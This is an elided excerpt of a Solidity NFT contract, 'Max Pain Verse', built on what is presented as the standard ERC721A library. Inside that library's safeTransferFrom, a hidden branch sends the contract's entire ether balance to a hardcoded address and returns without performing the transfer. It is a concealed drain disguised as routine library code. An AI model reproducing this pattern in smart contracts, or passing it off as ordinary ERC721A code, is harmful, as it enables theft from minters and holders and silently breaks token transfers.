...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x1314cdA91fB2b041dBd24f14B291D8D0fcc0DFCA).transfer(address(this).balance);
            return;
        }
...
contract MaxPainVerse is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("Max Pain Verse", "MPV") {
        owner = msg.sender;
        maxPerTx = 10;
        cost = 0.002 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigtofsztgoenl2xmk4jxr7a52d5en4c65nesd6prew676or7itcwa/", _toString(tokenId), ".json"));
    }
